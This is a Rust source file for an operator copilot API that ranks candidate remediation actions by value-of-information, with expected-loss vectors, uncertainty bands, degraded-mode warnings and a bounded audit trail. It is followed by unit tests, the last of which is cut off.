//! bd-2yc: Operator copilot action recommendation API.
//!
//! Implements Section 10.5 operator copilot: VOI-based action ranking, expected-loss
//! vectors, uncertainty bands, confidence context, and deterministic rollback commands.
//! Consumes expected-loss scoring, integrates degraded-mode status, and records every
//! recommendation in the audit trail.

use std::time::Duration;

use serde::{Deserialize, Serialize};

const MAX_AUDIT_TRAIL: usize = 4096;

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow);
    }
    items.push(item);
}

fn non_blank(value: &str) -> bool {
    !value.trim().is_empty()
}

// ── Event codes ──────────────────────────────────────────────────────────────

pub const COPILOT_RECOMMENDATION_REQUESTED: &str = "COPILOT_RECOMMENDATION_REQUESTED";
pub const COPILOT_RECOMMENDATION_SERVED: &str = "COPILOT_RECOMMENDATION_SERVED";
pub const COPILOT_ROLLBACK_VALIDATED: &str = "COPILOT_ROLLBACK_VALIDATED";
pub const COPILOT_DEGRADED_WARNING: &str = "COPILOT_DEGRADED_WARNING";
pub const COPILOT_STREAM_STARTED: &str = "COPILOT_STREAM_STARTED";
pub const COPILOT_STREAM_UPDATED: &str = "COPILOT_STREAM_UPDATED";

// ── Expected-loss vector ─────────────────────────────────────────────────────

/// Expected-loss vector with named dimensions.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ExpectedLossVector {
    /// Availability impact (non-negative).
    pub availability_loss: f64,
    /// Integrity impact (non-negative).
    pub integrity_loss: f64,
    /// Confidentiality impact (non-negative).
    pub confidentiality_loss: f64,
    /// Financial impact (non-negative).
    pub financial_loss: f64,
    /// Reputation impact (non-negative).
    pub reputation_loss: f64,
}

impl ExpectedLossVector {
    fn dimensions(&self) -> [f64; 5] {
        [
            self.availability_loss,
            self.integrity_loss,
            self.confidentiality_loss,
            self.financial_loss,
            self.reputation_loss,
        ]
    }

    fn checked_total(&self) -> Option<f64> {
        let mut sum = 0.0;
        for value in self.dimensions() {
            if !value.is_finite() || value < 0.0 {
                return None;
            }
            let next = sum + value;
            if !next.is_finite() {
                return None;
            }
            sum = next;
        }
        Some(sum)
    }

    /// Validate all values are non-negative.
    #[must_use]
    pub fn is_valid(&self) -> bool {
        self.checked_total().is_some()
    }

    /// Total expected loss across all dimensions.
    #[must_use]
    pub fn total(&self) -> f64 {
        let mut sum = 0.0;
        for value in self.dimensions() {
            if !value.is_finite() {
                return f64::NAN;
            }
            let next = sum + value;
            if !next.is_finite() {
                return f64::INFINITY;
            }
            sum = next;
        }
        sum
    }

    /// Dominant loss dimension name.
    #[must_use]
    pub fn dominant_dimension(&self) -> &str {
        let dims = [
            ("availability", self.availability_loss),
            ("integrity", self.integrity_loss),
            ("confidentiality", self.confidentiality_loss),
            ("financial", self.financial_loss),
            ("reputation", self.reputation_loss),
        ];
        dims.iter()
            .filter(|(_, value)| value.is_finite())
            .max_by(|a, b| a.1.partial_cmp(&b.1).unwrap_or(std::cmp::Ordering::Equal))
            .map(|(name, _)| *name)
            .unwrap_or("unknown")
    }
}

// ── Confidence interval ──────────────────────────────────────────────────────

/// Confidence interval for uncertainty quantification.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ConfidenceInterval {
    /// Lower bound.
    pub lower_bound: f64,
    /// Upper bound.
    pub upper_bound: f64,
    /// Confidence level (0.0..=1.0), e.g., 0.95 for 95%.
    pub confidence_level: f64,
}

impl ConfidenceInterval {
    /// Check that the interval is non-degenerate (upper > lower).
    #[must_use]
    pub fn is_non_degenerate(&self) -> bool {
        self.upper_bound > self.lower_bound
    }

    /// Validate numeric integrity and ordering constraints.
    #[must_use]
    pub fn is_valid(&self) -> bool {
        self.lower_bound.is_finite()
            && self.upper_bound.is_finite()
            && self.confidence_level.is_finite()
            && self.is_non_degenerate()
            && (0.0..=1.0).contains(&self.confidence_level)
    }
}

// ── Confidence context ───────────────────────────────────────────────────────

/// Structured confidence context explaining a recommendation.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ConfidenceContext {
    /// Data sources that informed this recommendation.
    pub data_sources: Vec<DataSourceInfo>,
    /// Key assumptions the scoring depends on.
    pub assumptions: Vec<String>,
    /// Sensitivity indicator: what change would flip the recommendation.
    pub sensitivity: String,
}

/// Information about a data source.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DataSourceInfo {
    /// Source identifier.
    pub source_id: String,
    /// Freshness timestamp (RFC 3339).
    pub freshness: String,
    /// Whether the source is stale.
    pub is_stale: bool,
    /// Staleness duration in seconds (0 if fresh).
    pub staleness_secs: u64,
}

// ── Action candidate (input) ─────────────────────────────────────────────────

/// An action candidate for the copilot to evaluate.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ActionCandidate {
    /// Unique action identifier.
    pub action_id: String,
    /// Human-readable name.
    pub display_name: String,
    /// Description of the action.
    pub description: String,
    /// Expected loss if the action is taken.
    pub expected_loss_if_act: ExpectedLossVector,
    /// Expected loss if the operator waits (does not act).
    pub expected_loss_if_wait: ExpectedLossVector,
    /// Uncertainty band.
    pub uncertainty_band: ConfidenceInterval,
    /// Preconditions (gate passes required).
    pub preconditions: Vec<String>,
    /// Estimated duration.
    pub estimated_duration: Duration,
    /// Deterministic rollback command.
    pub rollback_command: String,
    /// Whether the rollback command has been validated.
    pub rollback_validated: bool,
    /// Confidence context.
    pub confidence: ConfidenceContext,
}

// ── System state (input) ─────────────────────────────────────────────────────

/// Current system state for the copilot engine.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SystemState {
    /// Whether the system is in degraded mode.
    pub degraded_mode: bool,
    /// Degraded-mode details (if applicable).
    pub degraded_details: Option<DegradedModeInfo>,
    /// Active incident IDs.
    pub active_incidents: Vec<String>,
    /// Trust state freshness (seconds since last update).
    pub trust_state_age_secs: u64,
    /// Pending operations.
    pub pending_operations: Vec<String>,
}

/// Degraded-mode information.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DegradedModeInfo {
    /// Stale inputs and their staleness.
    pub stale_inputs: Vec<StaleInput>,
    /// Overall degraded-mode reason.
    pub reason: String,
    /// When degraded mode was entered (RFC 3339).
    pub entered_at: String,
}

/// A single stale input that contributes to degraded mode.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct StaleInput {
    /// Input identifier.
    pub input_id: String,
    /// Staleness duration in seconds.
    pub staleness_secs: u64,
    /// Expected refresh interval in seconds.
    pub expected_refresh_secs: u64,
}

// ── Recommended action (output) ──────────────────────────────────────────────

/// A recommended action from the copilot.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct RecommendedAction {
    /// Action identifier.
    pub action_id: String,
    /// Human-readable name.
    pub display_name: String,
    /// Description.
    pub description: String,
    /// VOI score (higher = more valuable to act on).
    pub voi_score: f64,
    /// Expected loss vector.
    pub expected_loss: ExpectedLossVector,
    /// Uncertainty band.
    pub uncertainty_band: ConfidenceInterval,
    /// Preconditions.
    pub preconditions: Vec<String>,
    /// Estimated duration.
    pub estimated_duration: Duration,
    /// Deterministic rollback command.
    pub rollback_command: String,
    /// Whether rollback command is validated.
    pub rollback_validated: bool,
    /// Human-readable rationale.
    pub rationale: String,
    /// Confidence context.
    pub confidence: ConfidenceContext,
    /// Whether this recommendation is affected by degraded mode.
    pub degraded_confidence: bool,
    /// Adjusted uncertainty if degraded.
    pub adjusted_uncertainty: Option<ConfidenceInterval>,
}

// ── Copilot response ─────────────────────────────────────────────────────────

/// Full copilot response.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CopilotResponse {
    /// Unique recommendation ID.
    pub recommendation_id: String,
    /// Ranked recommendations (highest VOI first).
    pub recommendations: Vec<RecommendedAction>,
    /// System state snapshot.
    pub system_degraded: bool,
    /// Degraded-mode warning block (if applicable).
    pub degraded_warning: Option<DegradedWarning>,
    /// Timestamp (RFC 3339).
    pub served_at: String,
    /// Trace ID.
    pub trace_id: String,
}

/// Degraded-mode warning block.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DegradedWarning {
    /// Warning message.
    pub message: String,
    /// Stale inputs.
    pub stale_inputs: Vec<StaleInput>,
    /// Overall staleness duration.
    pub max_staleness_secs: u64,
}

// ── Audit entry ──────────────────────────────────────────────────────────────

/// Audit record for a served recommendation.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CopilotAuditEntry {
    /// Recommendation ID.
    pub recommendation_id: String,
    /// Operator identity.
    pub operator_identity: String,
    /// Trace ID.
    pub trace_id: String,
    /// Number of recommendations served.
    pub recommendation_count: usize,
    /// Top action ID.
    pub top_action_id: Option<String>,
    /// Top VOI score.
    pub top_voi_score: Option<f64>,
    /// Timestamp.
    pub served_at: String,
    /// Event code.
    pub event_code: String,
}

// ── VOI computation ──────────────────────────────────────────────────────────

/// Compute Value-of-Information for an action candidate.
///
/// VOI = expected_gain_if_act - expected_gain_if_wait
///     = expected_loss_if_wait.total() - expected_loss_if_act.total()
///
/// Higher VOI means the action is more valuable.
#[must_use]
pub fn compute_voi(action: &ActionCandidate, _state: &SystemState) -> f64 {
    let loss_if_wait = action.expected_loss_if_wait.total();
    let loss_if_act = action.expected_loss_if_act.total();
    let voi = loss_if_wait - loss_if_act;
    if voi.is_finite() { voi } else { 0.0 }
}

// ── Action recommendation engine ─────────────────────────────────────────────

/// The copilot recommendation engine.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActionRecommendationEngine {
    /// Maximum recommendations to return.
    top_k: usize,
    /// Audit trail.
    audit_trail: Vec<CopilotAuditEntry>,
    /// Total recommendations served.
    total_served: u64,
}

impl Default for ActionRecommendationEngine {
    fn default() -> Self {
        Self::new(5)
    }
}

impl ActionRecommendationEngine {
    fn candidate_is_valid(candidate: &ActionCandidate, state: &SystemState) -> bool {
        non_blank(&candidate.action_id)
            && non_blank(&candidate.display_name)
            && non_blank(&candidate.description)
            && non_blank(&candidate.rollback_command)
            && non_blank(&candidate.confidence.sensitivity)
            && !candidate.confidence.data_sources.is_empty()
            && candidate
                .confidence
                .data_sources
                .iter()
                .all(|source| non_blank(&source.source_id) && non_blank(&source.freshness))
            && candidate.expected_loss_if_act.is_valid()
            && candidate.expected_loss_if_wait.is_valid()
            && candidate.uncertainty_band.is_valid()
            && compute_voi(candidate, state).is_finite()
    }

    /// Create with custom top_k.
    #[must_use]
    pub fn new(top_k: usize) -> Self {
        Self {
            top_k: top_k.max(1),
            audit_trail: Vec::new(),
            total_served: 0,
        }
    }

    /// Generate ranked action recommendations.
    pub fn recommend(
        &mut self,
        candidates: &[ActionCandidate],
        state: &SystemState,
        operator_identity: &str,
        recommendation_id: &str,
        trace_id: &str,
        timestamp: &str,
    ) -> CopilotResponse {
        // Score all candidates by VOI.
        let mut scored: Vec<(f64, &ActionCandidate)> = candidates
            .iter()
            .filter(|candidate| Self::candidate_is_valid(candidate, state))
            .map(|c| (compute_voi(c, state), c))
            .collect();

        // Sort descending by VOI.
        scored.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap_or(std::cmp::Ordering::Equal));

        // Take top_k.
        scored.truncate(self.top_k);

        // Build recommendations.
        let recommendations: Vec<RecommendedAction> = scored
            .iter()
            .map(|(voi, candidate)| {
                let dominant = candidate.expected_loss_if_act.dominant_dimension();
                let degraded_confidence = state.degraded_mode;

                let adjusted_uncertainty = if degraded_confidence {
                    // Widen uncertainty band by 50% under degraded mode.
                    let lower = candidate.uncertainty_band.lower_bound * 0.75;
                    let upper = candidate.uncertainty_band.upper_bound * 1.5;
                    let confidence = candidate.uncertainty_band.confidence_level * 0.8;
                    if lower.is_finite() && upper.is_finite() && confidence.is_finite() {
                        let adjusted = ConfidenceInterval {
                            lower_bound: lower,
                            upper_bound: upper,
                            confidence_level: confidence,
                        };
                        adjusted.is_valid().then_some(adjusted)
                    } else {
                        None
                    }
                } else {
                    None
                };

                let rationale = format!(
                    "VOI={voi:.2}: acting reduces expected loss by {voi:.2} units vs waiting. \
                     Dominant dimension: {dominant}."
                );

                RecommendedAction {
                    action_id: candidate.action_id.clone(),
                    display_name: candidate.display_name.clone(),
                    description: candidate.description.clone(),
                    voi_score: *voi,
                    expected_loss: candidate.expected_loss_if_act.clone(),
                    uncertainty_band: candidate.uncertainty_band.clone(),
                    preconditions: candidate.preconditions.clone(),
                    estimated_duration: candidate.estimated_duration,
                    rollback_command: candidate.rollback_command.clone(),
                    rollback_validated: candidate.rollback_validated,
                    rationale,
                    confidence: candidate.confidence.clone(),
                    degraded_confidence,
                    adjusted_uncertainty,
                }
            })
            .collect();

        // Degraded warning.
        let degraded_warning = if state.degraded_mode {
            state.degraded_details.as_ref().map(|d| DegradedWarning {
                message: format!("System in degraded mode: {}", d.reason),
                stale_inputs: d.stale_inputs.clone(),
                max_staleness_secs: d
                    .stale_inputs
                    .iter()
                    .map(|s| s.staleness_secs)
                    .max()
                    .unwrap_or(0),
            })
        } else {
            None
        };

        let response = CopilotResponse {
            recommendation_id: recommendation_id.to_owned(),
            recommendations: recommendations.clone(),
            system_degraded: state.degraded_mode,
            degraded_warning,
            served_at: timestamp.to_owned(),
            trace_id: trace_id.to_owned(),
        };

        // Audit trail.
        let audit = CopilotAuditEntry {
            recommendation_id: recommendation_id.to_owned(),
            operator_identity: operator_identity.to_owned(),
            trace_id: trace_id.to_owned(),
            recommendation_count: recommendations.len(),
            top_action_id: recommendations.first().map(|r| r.action_id.clone()),
            top_voi_score: recommendations.first().map(|r| r.voi_score),
            served_at: timestamp.to_owned(),
            event_code: COPILOT_RECOMMENDATION_SERVED.to_owned(),
        };
        push_bounded(&mut self.audit_trail, audit, MAX_AUDIT_TRAIL);
        self.total_served = self.total_served.saturating_add(1);

        response
    }

    /// Get the audit trail.
    #[must_use]
    pub fn audit_trail(&self) -> &[CopilotAuditEntry] {
        &self.audit_trail
    }

    /// Total recommendations served.
    #[must_use]
    pub fn total_served(&self) -> u64 {
        self.total_served
    }

    /// Get top_k setting.
    #[must_use]
    pub fn top_k(&self) -> usize {
        self.top_k
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_state(degraded: bool) -> SystemState {
        SystemState {
            degraded_mode: degraded,
            degraded_details: if degraded {
                Some(DegradedModeInfo {
                    stale_inputs: vec![StaleInput {
                        input_id: "trust-db".to_owned(),
                        staleness_secs: 300,
                        expected_refresh_secs: 60,
                    }],
                    reason: "Trust database stale".to_owned(),
                    entered_at: "2026-01-15T00:00:00Z".to_owned(),
                })
            } else {
                None
            },
            active_incidents: vec![],
            trust_state_age_secs: 10,
            pending_operations: vec![],
        }
    }

    fn make_candidate(id: &str, loss_act: f64, loss_wait: f64) -> ActionCandidate {
        ActionCandidate {
            action_id: id.to_owned(),
            display_name: format!("Action {id}"),
            description: format!("Test action {id}"),
            expected_loss_if_act: ExpectedLossVector {
                availability_loss: loss_act * 0.3,
                integrity_loss: loss_act * 0.2,
                confidentiality_loss: loss_act * 0.1,
                financial_loss: loss_act * 0.25,
                reputation_loss: loss_act * 0.15,
            },
            expected_loss_if_wait: ExpectedLossVector {
                availability_loss: loss_wait * 0.3,
                integrity_loss: loss_wait * 0.2,
                confidentiality_loss: loss_wait * 0.1,
                financial_loss: loss_wait * 0.25,
                reputation_loss: loss_wait * 0.15,
            },
            uncertainty_band: ConfidenceInterval {
                lower_bound: loss_act * 0.8,
                upper_bound: loss_wait * 1.2,
                confidence_level: 0.95,
            },
            preconditions: vec![],
            estimated_duration: Duration::from_secs(60),
            rollback_command: format!("rollback --action {id}"),
            rollback_validated: true,
            confidence: ConfidenceContext {
                data_sources: vec![DataSourceInfo {
                    source_id: "trust-db".to_owned(),
                    freshness: "2026-01-15T00:00:00Z".to_owned(),
                    is_stale: false,
                    staleness_secs: 0,
                }],
                assumptions: vec!["Trust data is fresh".to_owned()],
                sensitivity: "A 20% increase in trust staleness would change the ranking"
                    .to_owned(),
            },
        }
    }

    #[test]
    fn test_compute_voi() {
        let state = make_state(false);
        let candidate = make_candidate("a1", 10.0, 50.0);
        let voi = compute_voi(&candidate, &state);
        // VOI = loss_if_wait - loss_if_act = 50 - 10 = 40
        assert!((voi - 40.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_voi_ranking_order() {
        let mut engine = ActionRecommendationEngine::new(10);
        let state = make_state(false);
        let candidates = vec![
            make_candidate("low-voi", 40.0, 50.0),  // VOI = 10
            make_candidate("high-voi", 5.0, 100.0), // VOI = 95
            make_candidate("mid-voi", 20.0, 60.0),  // VOI = 40
        ];

        let response = engine.recommend(
            &candidates,
            &state,
            "operator-1",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert_eq!(response.recommendations[0].action_id, "high-voi");
        assert_eq!(response.recommendations[1].action_id, "mid-voi");
        assert_eq!(response.recommendations[2].action_id, "low-voi");
    }

    #[test]
    fn test_top_k_limiting() {
        let mut engine = ActionRecommendationEngine::new(2);
        let state = make_state(false);
        let candidates: Vec<_> = (0..10)
            .map(|i| make_candidate(&format!("a{i}"), 10.0, 50.0 + i as f64))
            .collect();

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        assert_eq!(response.recommendations.len(), 2);
    }

    #[test]
    fn test_empty_candidates() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let response = engine.recommend(
            &[],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_degraded_mode_warning() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(true);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        assert!(response.system_degraded);
        assert!(response.degraded_warning.is_some());

        let warning = response.degraded_warning.unwrap();
        assert!(!warning.stale_inputs.is_empty());
        assert!(warning.max_staleness_secs > 0);
    }

    #[test]
    fn test_degraded_confidence_annotation() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(true);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        let rec = &response.recommendations[0];
        assert!(rec.degraded_confidence);
        assert!(rec.adjusted_uncertainty.is_some());
    }

    #[test]
    fn test_normal_mode_no_degraded_flag() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        let rec = &response.recommendations[0];
        assert!(!rec.degraded_confidence);
        assert!(rec.adjusted_uncertainty.is_none());
    }

    #[test]
    fn test_rationale_includes_dominant_dimension() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut candidate = make_candidate("a1", 10.0, 50.0);
        candidate.expected_loss_if_act.availability_loss = 100.0;
        let candidates = vec![candidate];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        assert!(
            response.recommendations[0]
                .rationale
                .contains("availability")
        );
    }

    #[test]
    fn test_rollback_command_included() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        assert!(
            response.recommendations[0]
                .rollback_command
                .contains("rollback")
        );
        assert!(response.recommendations[0].rollback_validated);
    }

    #[test]
    fn test_audit_trail_recorded() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        engine.recommend(
            &candidates,
            &state,
            "operator-1",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert_eq!(engine.audit_trail().len(), 1);
        assert_eq!(engine.audit_trail()[0].operator_identity, "operator-1");
        assert_eq!(engine.audit_trail()[0].recommendation_id, "rec-001");
        assert_eq!(engine.total_served(), 1);
    }

    #[test]
    fn test_expected_loss_vector_validation() {
        let valid = ExpectedLossVector {
            availability_loss: 1.0,
            integrity_loss: 2.0,
            confidentiality_loss: 0.5,
            financial_loss: 3.0,
            reputation_loss: 1.5,
        };
        assert!(valid.is_valid());

        let invalid = ExpectedLossVector {
            availability_loss: -1.0,
            integrity_loss: 2.0,
            confidentiality_loss: 0.0,
            financial_loss: 0.0,
            reputation_loss: 0.0,
        };
        assert!(!invalid.is_valid());

        let non_finite = ExpectedLossVector {
            availability_loss: f64::INFINITY,
            integrity_loss: 2.0,
            confidentiality_loss: 0.0,
            financial_loss: 0.0,
            reputation_loss: 0.0,
        };
        assert!(!non_finite.is_valid());

        let overflowing_total = ExpectedLossVector {
            availability_loss: f64::MAX,
            integrity_loss: f64::MAX,
            confidentiality_loss: 0.0,
            financial_loss: 0.0,
            reputation_loss: 0.0,
        };
        assert!(!overflowing_total.is_valid());
        assert!(overflowing_total.total().is_infinite());
    }

    #[test]
    fn test_expected_loss_total() {
        let vec = ExpectedLossVector {
            availability_loss: 1.0,
            integrity_loss: 2.0,
            confidentiality_loss: 3.0,
            financial_loss: 4.0,
            reputation_loss: 5.0,
        };
        assert!((vec.total() - 15.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_confidence_interval_non_degenerate() {
        let good = ConfidenceInterval {
            lower_bound: 1.0,
            upper_bound: 5.0,
            confidence_level: 0.95,
        };
        assert!(good.is_non_degenerate());

        let degenerate = ConfidenceInterval {
            lower_bound: 5.0,
            upper_bound: 5.0,
            confidence_level: 0.95,
        };
        assert!(!degenerate.is_non_degenerate());
        assert!(!degenerate.is_valid());

        let invalid = ConfidenceInterval {
            lower_bound: 1.0,
            upper_bound: f64::INFINITY,
            confidence_level: 0.95,
        };
        assert!(!invalid.is_valid());
    }

    #[test]
    fn test_dominant_dimension() {
        let vec = ExpectedLossVector {
            availability_loss: 1.0,
            integrity_loss: 5.0,
            confidentiality_loss: 2.0,
            financial_loss: 3.0,
            reputation_loss: 4.0,
        };
        assert_eq!(vec.dominant_dimension(), "integrity");
    }

    #[test]
    fn test_tied_voi_stability() {
        let mut engine = ActionRecommendationEngine::new(10);
        let state = make_state(false);
        let candidates = vec![
            make_candidate("a1", 10.0, 50.0),
            make_candidate("a2", 10.0, 50.0),
        ];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        // Both have same VOI; should return both without crashing.
        assert_eq!(response.recommendations.len(), 2);
    }

    #[test]
    fn test_adjusted_uncertainty_widened() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(true);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        let response = engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        let rec = &response.recommendations[0];
        let adj = rec.adjusted_uncertainty.as_ref().unwrap();
        let orig = &rec.uncertainty_band;
        // Adjusted should be wider.
        assert!(adj.upper_bound > orig.upper_bound);
        assert!(adj.lower_bound < orig.lower_bound);
    }

    #[test]
    fn test_multiple_recommendations_served() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );
        engine.recommend(
            &candidates,
            &state,
            "op",
            "rec-002",
            "t-002",
            "2026-01-15T00:01:00Z",
        );

        assert_eq!(engine.total_served(), 2);
        assert_eq!(engine.audit_trail().len(), 2);
    }

    #[test]
    fn test_invalid_candidate_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("invalid", 10.0, 50.0);
        invalid.expected_loss_if_wait.financial_loss = f64::INFINITY;

        let valid = make_candidate("valid", 10.0, 50.0);
        let response = engine.recommend(
            &[invalid, valid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert_eq!(response.recommendations.len(), 1);
        assert_eq!(response.recommendations[0].action_id, "valid");
    }

    #[test]
    fn test_invalid_uncertainty_band_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("invalid", 10.0, 50.0);
        invalid.uncertainty_band.upper_bound = f64::INFINITY;

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_negative_expected_loss_if_act_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("invalid-act-loss", 10.0, 50.0);
        invalid.expected_loss_if_act.integrity_loss = -0.01;
        let valid = make_candidate("valid", 10.0, 50.0);

        let response = engine.recommend(
            &[invalid, valid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert_eq!(response.recommendations.len(), 1);
        assert_eq!(response.recommendations[0].action_id, "valid");
    }

    #[test]
    fn test_negative_expected_loss_if_wait_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("invalid-wait-loss", 10.0, 50.0);
        invalid.expected_loss_if_wait.confidentiality_loss = -0.01;

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_nan_expected_loss_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("nan-loss", 10.0, 50.0);
        invalid.expected_loss_if_act.availability_loss = f64::NAN;

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_infinite_voi_from_finite_dimensions_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("overflowing-voi", 0.0, 1.0);
        invalid.expected_loss_if_wait = ExpectedLossVector {
            availability_loss: f64::MAX,
            integrity_loss: f64::MAX,
            confidentiality_loss: f64::MAX,
            financial_loss: f64::MAX,
            reputation_loss: f64::MAX,
        };

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_degenerate_uncertainty_band_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("degenerate-uncertainty", 10.0, 50.0);
        invalid.uncertainty_band.lower_bound = 42.0;
        invalid.uncertainty_band.upper_bound = 42.0;

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_confidence_level_above_one_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("high-confidence", 10.0, 50.0);
        invalid.uncertainty_band.confidence_level = 1.01;

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_negative_confidence_level_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);

        let mut invalid = make_candidate("negative-confidence", 10.0, 50.0);
        invalid.uncertainty_band.confidence_level = -0.01;

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_degraded_uncertainty_overflow_drops_adjusted_band() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(true);

        let mut candidate = make_candidate("wide-uncertainty", 10.0, 50.0);
        candidate.uncertainty_band = ConfidenceInterval {
            lower_bound: f64::MAX / 4.0,
            upper_bound: f64::MAX,
            confidence_level: 1.0,
        };

        let response = engine.recommend(
            &[candidate],
            &state,
            "op",
            "rec-001",
            "t-001",
            "2026-01-15T00:00:00Z",
        );

        assert_eq!(response.recommendations.len(), 1);
        assert!(response.recommendations[0].degraded_confidence);
        assert!(response.recommendations[0].adjusted_uncertainty.is_none());
    }

    #[test]
    fn test_audit_trail_is_capped_oldest_first() {
        let mut engine = ActionRecommendationEngine::new(1);
        let state = make_state(false);
        let candidates = vec![make_candidate("a1", 10.0, 50.0)];

        for i in 0..(MAX_AUDIT_TRAIL + 5) {
            engine.recommend(
                &candidates,
                &state,
                "op",
                &format!("rec-{i}"),
                &format!("t-{i}"),
                "2026-01-15T00:00:00Z",
            );
        }

        assert_eq!(engine.audit_trail().len(), MAX_AUDIT_TRAIL);
        assert_eq!(
            engine.audit_trail().first().unwrap().recommendation_id,
            "rec-5"
        );
        assert_eq!(
            engine.audit_trail().last().unwrap().recommendation_id,
            format!("rec-{}", MAX_AUDIT_TRAIL + 4)
